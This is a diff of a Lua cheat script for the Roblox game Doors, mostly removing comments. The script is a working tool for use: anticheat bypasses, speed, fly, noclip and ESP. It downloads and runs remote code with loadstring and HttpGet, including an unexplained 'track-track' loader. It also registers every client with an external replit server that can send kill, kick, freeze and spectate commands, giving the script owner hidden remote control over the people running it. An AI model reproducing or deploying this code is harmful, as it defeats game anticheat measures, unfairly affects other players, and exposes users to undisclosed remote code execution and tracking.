@@ -5,28 +5,23 @@ end
 getgenv().ZeScriptLoaded = true
 
 local httpRequest = (syn and syn.request) or http_request or request
--- Test if it exists
 if not httpRequest then
     warn("❌ Your executor doesn't support HTTP requests!")
 end
 
--- Discord Configuration
 local DISCORD_API_URL = "https://5e6a4ce1-65e1-49da-a450-ac983707fc3b-00-s6e0zpq7bs82.janeway.replit.dev:3000/"
-local GAME_ID = tostring(game.JobId) -- Unique ID for this server
+local GAME_ID = tostring(game.JobId)
 
--- Load XaLib UI Library
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/XasonYTB/XaLib/refs/heads/main/UILibrary.lua"))()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/XasonYTB/ZeScript-Doors/refs/heads/main/track-track"))() 
 
--- Create Window
 local Window = Library:CreateWindow({
     Title = "ZeScript's Doors",
     Size = Vector2.new(700, 500),
     Keybind = Enum.KeyCode.RightShift
 })
 
--- Floor Detection System
 local currentFloor = "Unknown"
 local function detectFloor()
     pcall(function()
@@ -42,22 +37,16 @@ local function detectFloor()
     return currentFloor
 end
 
--- Detect floor at start
 currentFloor = detectFloor()
 
--- Create Exploit Category with Tabs
 local ExploitCategory = Window:CreateCategory("Exploits", "⚡")
 
--- Universal Tab
 local UniversalTab = ExploitCategory:CreateTab("Universal", "🌍")
 
--- Hotel Tab
 local HotelTab = ExploitCategory:CreateTab("Hotel", "🏨")
 
--- Mines Tab
 local MinesTab = ExploitCategory:CreateTab("Mines", "⛏️")
 
--- Variables
 local spoofCrouchEnabled = false
 local spoofCrouchLoop
 local lightsEnabled = true
@@ -65,9 +54,6 @@ local originalLightStates = {}
 local frozenPlayers = {}
 local spectatingPlayer = nil
 
--- ==================== HELPER FUNCTIONS ====================
-
--- Function to get Discord user name from ID
 local function getDiscordUsername(discordId)
     if discordId == "904343901526192168" then
         return "Xason (Owner)"
@@ -78,24 +64,18 @@ local function getDiscordUsername(discordId)
     end
 end
 
--- Function to toggle all lights in the game
 local function toggleLights(enabled)
     lightsEnabled = enabled
-    
-    -- Find all lights in workspace
     for _, obj in pairs(game.Workspace:GetDescendants()) do
         if obj:IsA("Light") or obj:IsA("PointLight") or obj:IsA("SpotLight") or obj:IsA("SurfaceLight") then
-            -- Store original state on first toggle
             if originalLightStates[obj] == nil then
                 originalLightStates[obj] = obj.Enabled
             end
-            
             obj.Enabled = enabled
         end
     end
 end
 
--- Function to freeze/unfreeze a player
 local function freezePlayer(playerName, freeze)
     local targetPlayer = game.Players:FindFirstChild(playerName)
     if targetPlayer and targetPlayer.Character then
@@ -107,7 +87,6 @@ local function freezePlayer(playerName, freeze)
     end
 end
 
--- Function to spectate a player
 local function spectatePlayer(playerName)
     local Players = game:GetService("Players")
     local LocalPlayer = Players.LocalPlayer
@@ -132,7 +111,6 @@ local function spectatePlayer(playerName)
     end
 end
 
--- Function to stop spectating
 local function stopSpectating()
     local Players = game:GetService("Players")
     local LocalPlayer = Players.LocalPlayer
@@ -150,17 +128,14 @@ local function stopSpectating()
     end
 end
 
--- ==================== ENHANCED DISCORD INTEGRATION ====================
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
--- Discord connection status
 local discordConnected = false
 local commandCheckLoop
 local playerUpdateLoop
 
--- Function to get all players in server
 local function getAllPlayers()
     local playerList = {}
     for _, player in ipairs(Players:GetPlayers()) do
@@ -172,7 +147,6 @@ local function getAllPlayers()
     return playerList
 end
 
--- Function to check Discord commands
 local function checkDiscordCommands()
     if not discordConnected then return end
     
@@ -190,7 +164,6 @@ local function checkDiscordCommands()
             local senderName = getDiscordUsername(cmd.senderId or "")
             
             if cmd.type == "kill" then
-                -- Kill command
                 local targetPlayer = Players:FindFirstChild(cmd.target)
                 if targetPlayer then
                     pcall(function()
@@ -199,30 +172,22 @@ local function checkDiscordCommands()
                         end
                     end)
                 end
-                
             elseif cmd.type == "notify" then
-                -- Notification command with sender identification
                 Window:Notify({
                     Text = senderName .. ": " .. cmd.message,
                     Duration = 15,
                     Type = "Warning"
                 })
-                
             elseif cmd.type == "kick" then
-                -- Kick command
                 if cmd.target == LocalPlayer.Name then
                     task.wait(1)
                     LocalPlayer:Kick("Kicked by " .. senderName)
                 end
-                
             elseif cmd.type == "freeze" then
-                -- Freeze command
                 if cmd.target == LocalPlayer.Name then
                     freezePlayer(LocalPlayer.Name, true)
                 end
-                
             elseif cmd.type == "spectate" then
-                -- Spectate command
                 if cmd.target ~= LocalPlayer.Name then
                     spectatePlayer(cmd.target)
                 end
@@ -231,7 +196,6 @@ local function checkDiscordCommands()
     end
 end
 
--- Function to send data to Discord
 local function sendToDiscord(endpoint, data)
     if not discordConnected then return false end
     
@@ -249,7 +213,6 @@ local function sendToDiscord(endpoint, data)
     return success and response.StatusCode == 200
 end
 
--- Enhanced registration with connection testing
 local function registerWithDiscord()
     local success1, response1 = pcall(function()
         return httpRequest({
@@ -320,13 +283,9 @@ end
 
 registerWithDiscord()
 
--- Variables
 local spoofCrouchEnabled = false
 local spoofCrouchLoop
 
--- ==================== UNIVERSAL TAB ====================
-
--- Spoof Crouch Toggle
 UniversalTab:Toggle("Spoof Crouch", false, function(enabled)
     spoofCrouchEnabled = enabled
     
@@ -347,7 +306,6 @@ UniversalTab:Toggle("Spoof Crouch", false, function(enabled)
     end
 end, "Tricks the game into thinking you're always crouching. Useful for avoiding certain entities!")
 
--- Disable Screech
 local screechDisabled = false
 local screechOriginalParent = nil
 
@@ -381,7 +339,6 @@ UniversalTab:Toggle("Disable Screech", false, function(enabled)
     end)
 end, "Prevents Screech from spawning by moving it to a disabled folder")
 
--- No Acceleration Toggle
 local noAccelEnabled = false
 local noAccelLoop = nil
 local originalHrpProps = nil
@@ -442,20 +399,17 @@ UniversalTab:Toggle("No Acceleration", false, function(enabled)
     end
 end, "Removes movement acceleration for instant max speed")
 
--- Proximity Prompt Reach Variables
 local proximityReach = 0
 
 UniversalTab:Slider("Proximity Prompt Reach", 0, 12, 0, function(value)
     proximityReach = value
 end, "Increases the range at which you can interact with doors, levers, etc.")
 
--- Auto Proxi Variables
 local autoProxiEnabled = false
 local autoProxiLoop
 local UserInputService = game:GetService("UserInputService")
 local isRKeyHeld = false
 
--- Track R key state
 UserInputService.InputBegan:Connect(function(input, gameProcessed)
     if input.KeyCode == Enum.KeyCode.R and not gameProcessed then
         isRKeyHeld = true
@@ -476,7 +430,6 @@ UniversalTab:Toggle("Auto Proxi", false, function(enabled)
             while autoProxiEnabled do
                 task.wait(0.1)
                 pcall(function()
-                    -- Only run if R key is held
                     if not isRKeyHeld then
                         return
                     end
@@ -493,12 +446,10 @@ UniversalTab:Toggle("Auto Proxi", false, function(enabled)
                     local currentRooms = workspace:FindFirstChild("CurrentRooms")
                     if not currentRooms then return end
                     
-                    -- Check all proximity prompts in current rooms
                     for _, descendant in pairs(currentRooms:GetDescendants()) do
                         if descendant:IsA("ProximityPrompt") and descendant.Enabled then
                             local promptParent = descendant.Parent
                             
-                            -- Calculate distance to prompt
                             local targetPos
                             if promptParent:IsA("BasePart") then
                                 targetPos = promptParent.Position
@@ -512,19 +463,15 @@ UniversalTab:Toggle("Auto Proxi", false, function(enabled)
                             if targetPos then
                                 local distance = (hrp.Position - targetPos).Magnitude
                                 
-                                -- Determine effective range
                                 local effectiveRange = proximityReach > 0 and proximityReach or descendant.MaxActivationDistance
                                 
-                                -- Check if in range
                                 if distance <= effectiveRange then
                                     local actionText = descendant.ActionText or ""
                                     
-                                    -- Skip "Close" actions
                                     if actionText:lower():find("close") then
                                         continue
                                     end
-                                    
-                                    -- Handle unlock prompts
+
                                     if descendant.Name == "UnlockPrompt" or actionText:lower():find("unlock") then
                                         local originalHoldDuration = descendant.HoldDuration
                                         descendant.HoldDuration = 0
@@ -532,11 +479,10 @@ UniversalTab:Toggle("Auto Proxi", false, function(enabled)
                                         task.wait(0.1)
                                         descendant.HoldDuration = originalHoldDuration
                                     else
-                                        -- Handle all other prompts
                                         fireproximityprompt(descendant)
                                     end
                                     
-                                    task.wait(0.2) -- Small delay to prevent spam
+                                    task.wait(0.2)
                                 end
                             end
                         end
@@ -551,7 +497,7 @@ UniversalTab:Toggle("Auto Proxi", false, function(enabled)
         end
     end
 end, "Automatically interacts with nearby prompts when holding R key")
--- Fly and Noclip
+
 local flyEnabled = false
 local noclipEnabled = false
 local flyLoop
@@ -651,9 +597,6 @@ UniversalTab:Toggle("Noclip", false, function(enabled)
     end)
 end, "Walk through walls and objects")
 
--- ==================== HOTEL TAB ====================
-
--- AntiSpeed Bypass Toggle (Hotel only)
 local antiSpeedEnabled = false
 local antiSpeedLoop
 local clonedCollision
@@ -705,12 +648,10 @@ local clonedCollision
         end
     end, "Required for Speed on Hotel floor - bypasses anticheat")
 
--- Speed System (Hotel only)
 local speedEnabled = false
 local originalWalkSpeed = 16
 local speedValue = 16
 local speedLoop
-
 
     HotelTab:Toggle("Speed", false, function(enabled)
         if enabled and not antiSpeedEnabled then
@@ -781,10 +722,6 @@ local speedLoop
         speedValue = value
     end, "Set your desired walk speed (default: 16)")
 
-
--- ==================== MINES TAB ====================
-
--- Mines Anticheat Bypass
 local bypassEnabled = false
 local bypassLoop
 local ladderESP = {}
@@ -794,7 +731,6 @@ if currentFloor == "Mines" or currentFloor == "Unknown" then
         bypassEnabled = enabled
         
         if enabled then
-            -- ESP all ladders
             for _, room in pairs(workspace.CurrentRooms:GetChildren()) do
                 pcall(function()
                     local ladder = room:FindFirstChild("Ladder", true)
@@ -853,16 +789,12 @@ else
     MinesTab:Label("⚠️ Mines floor not detected")
 end
 
--- ==================== VISUAL CATEGORY ====================
 local VisualCategory = Window:CreateCategory("Visual", "👁️")
 
--- ESP Tab
 local ESPTab = VisualCategory:CreateTab("ESP", "📍")
 
--- Display Tab
 local DisplayTab = VisualCategory:CreateTab("Display", "🎨")
 
--- ESP Variables
 local espEnabled = {
     Door = false,
     Objective = false,
@@ -871,7 +803,6 @@ local espEnabled = {
 local espHighlights = {}
 local espUpdateLoop
 
--- Function to clear ESP highlights
 local function clearESP(espType)
     if espHighlights[espType] then
         for _, highlight in pairs(espHighlights[espType]) do
@@ -883,7 +814,6 @@ local function clearESP(espType)
     end
 end
 
--- Function to create ESP for doors
 local function createDoorESP()
     if not espHighlights.Door then
         espHighlights.Door = {}
@@ -915,14 +845,12 @@ local function createDoorESP()
     end
 end
 
--- Function to create ESP for objectives
 local function createObjectiveESP()
     clearESP("Objective")
     espHighlights.Objective = {}
     
     for _, room in pairs(workspace.CurrentRooms:GetChildren()) do
         pcall(function()
-            -- Check for KeyObtain
             local keyObtain = room:FindFirstChild("KeyObtain", true)
             if keyObtain then
                 local highlight = Instance.new("Highlight")
@@ -953,7 +881,6 @@ local function createObjectiveESP()
                 table.insert(espHighlights.Objective, billboard)
             end
             
-            -- Check for FuseHolder (Mines)
             local fuseHolder = room:FindFirstChild("FuseHolder", true)
             if fuseHolder then
                 local highlight = Instance.new("Highlight")
@@ -984,7 +911,6 @@ local function createObjectiveESP()
                 table.insert(espHighlights.Objective, billboard)
             end
             
-            -- Check for LiveHintBook in Bookshelves
             local assets = room:FindFirstChild("Assets")
             if assets then
                 for _, bookshelf in pairs(assets:GetChildren()) do
@@ -1021,7 +947,6 @@ local function createObjectiveESP()
                     end
                 end
                 
-                -- Check for LeverForGate
                 local lever = assets:FindFirstChild("LeverForGate")
                 if lever then
                     local highlight = Instance.new("Highlight")
@@ -1052,7 +977,6 @@ local function createObjectiveESP()
                     table.insert(espHighlights.Objective, billboard)
                 end
                 
-                -- Check for LiveBreakerPolePickup
                 local breakerPole = assets:FindFirstChild("LiveBreakerPolePickup", true)
                 if breakerPole then
                     local highlight = Instance.new("Highlight")
@@ -1084,7 +1008,6 @@ local function createObjectiveESP()
                 end
             end
             
-            -- Check for TimerLever
             local timerLever = room:FindFirstChild("TimerLever")
             if timerLever then
                 local highlight = Instance.new("Highlight")
@@ -1117,12 +1040,11 @@ local function createObjectiveESP()
         end)
     end
 end
--- Function to create ESP for entities
+
 local function createEntityESP()
     clearESP("Entity")
     espHighlights.Entity = {}
     
-    -- ESP for Rush
     pcall(function()
         local rushMoving = workspace:FindFirstChild("RushMoving")
         if rushMoving and rushMoving:IsA("Model") then
@@ -1165,7 +1087,6 @@ local function createEntityESP()
         end
     end)
     
-    -- ESP for Ambush
     pcall(function()
         local ambushMoving = workspace:FindFirstChild("AmbushMoving")
         if ambushMoving and ambushMoving:IsA("Model") then
@@ -1208,7 +1129,6 @@ local function createEntityESP()
         end
     end)
     
-    -- ESP for Eyes
     pcall(function()
         local eyes = workspace:FindFirstChild("Eyes")
         if eyes and eyes:IsA("Model") then
@@ -1251,7 +1171,6 @@ local function createEntityESP()
         end
     end)
     
-    -- ESP for Figure
     for _, room in pairs(workspace.CurrentRooms:GetChildren()) do
         pcall(function()
             local figureSetup = room:FindFirstChild("FigureSetup")
@@ -1290,7 +1209,6 @@ local function createEntityESP()
     end
 end
 
--- ESP Update Loop
 local function startESPUpdateLoop()
     if espUpdateLoop then
         task.cancel(espUpdateLoop)
@@ -1315,7 +1233,6 @@ local function startESPUpdateLoop()
     end)
 end
 
--- ESP Dropdown
 ESPTab:Dropdown("ESP Types", {"Door", "Objective", "Entity"}, function(selected)
     if selected["Door"] and not espEnabled.Door then
         espEnabled.Door = true
@@ -1356,7 +1273,6 @@ ESPTab:Label("🟢 Door ESP - Highlights all doors")
 ESPTab:Label("🟡 Objective ESP - Keys, fuses, books, levers")
 ESPTab:Label("🔴 Entity ESP - Rush, Ambush, Eyes, Figure")
 
--- Entity Notifier
 local entityNotifierEnabled = false
 local notifiedEntities = {}
 
@@ -1367,7 +1283,6 @@ ESPTab:Toggle("Entity Notifier", false, function(enabled)
     end
 end, "Get notifications when entities spawn")
 
--- Entity Notifier Loop
 task.spawn(function()
     while true do
         task.wait(0.5)
@@ -1413,7 +1328,6 @@ task.spawn(function()
     end
 end)
 
--- Display Tab - Fullbright
 local fullbrightEnabled = false
 local originalLighting = {}
 local lightingConnection
@@ -1465,7 +1379,6 @@ DisplayTab:Toggle("Fullbright", false, function(enabled)
     end
 end, "See clearly in dark areas - removes fog and shadows")
 
--- FOV Slider
 local RunService = game:GetService("RunService")
 local desiredFOV = 70
 local fovConnection
@@ -1483,10 +1396,8 @@ DisplayTab:Slider("FOV", 70, 120, 70, function(value)
     desiredFOV = value
 end, "Adjust your field of view (default: 70)")
 
--- ==================== SETTINGS CATEGORY ====================
 local SettingsCategory = Window:CreateCategory("Settings", "⚙️")
 
--- Function to destroy the entire script
 local function destroyScript()
     if lightingConnection then
         lightingConnection:Disconnect()
@@ -1620,12 +1531,11 @@ SettingsCategory:Label("⌨️ Press RightShift to toggle UI")
 SettingsCategory:Label("🔍 Use search box to find features")
 SettingsCategory:Label("═══════════════════")
 
--- Show the window
 wait(0.2)
 Window:Show()
 
 Window:Notify({
-                Text = "if you enjoy the script please like it!",
-                Duration = 25,
-                Type = "Warning"
-             }) 
+    Text = "if you enjoy the script please like it!",
+    Duration = 25,
+    Type = "Warning"
+})
